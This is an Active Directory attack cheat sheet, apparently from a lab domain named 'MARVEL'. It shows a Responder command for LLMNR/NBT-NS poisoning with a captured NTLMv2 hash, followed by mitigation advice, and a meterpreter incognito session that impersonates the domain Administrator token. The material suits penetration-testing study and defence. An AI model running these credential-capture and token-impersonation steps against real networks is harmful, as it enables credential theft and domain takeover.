# ADCheatSheet
Active Directory Cheat Sheet

#### LLMNR/NBT-NS poisoning 

`responder -I eht0 -rdw`
```
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 192.168.22.137
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:93b1788c58f638fa:B2CA7875629275D309D734EC71F9E286:0101000000000000C0653150DE09D2013126B37886358E89000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000001000000002000006010A3B377FCEC86F76295A06081F0D3B51DCECFF04B43D87CAF05972C41D0A80A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00320032002E003100380033000000000000000000
```
Recommendations:

```
Best option is to disable LLMNR and NBT-NS.
If company must use LLMNR and NBT-NS, enable Network Access Control (if attacker cannot access to networ, tha attack can not be performed )
Require Strong user password (e.g. >12 characters in lengt and limit common word usage)
```

#### Token Impersonation (meterpreter)
Requirements: 
- NT AUTHORITY SYSTEM
- meterpreter proc arch = sys arch
```
meterpreter > load incognito 
Loading extension incognito...Success.
meterpreter > list_tokens 
Usage: list_tokens <list_order_option>

Lists all accessible tokens and their privilege level

OPTIONS:

    -g        List tokens by unique groupname
    -u        List tokens by unique username

meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
Font Driver Host\UMFD-2
MARVEL\Administrator
MARVEL\fcastle
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1
Window Manager\DWM-2

Impersonation Tokens Available
========================================
No tokens available

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > impersonate_token MARVEL\\Administrator
[+] Delegation token available
[+] Successfully impersonated user MARVEL\Administrator
```
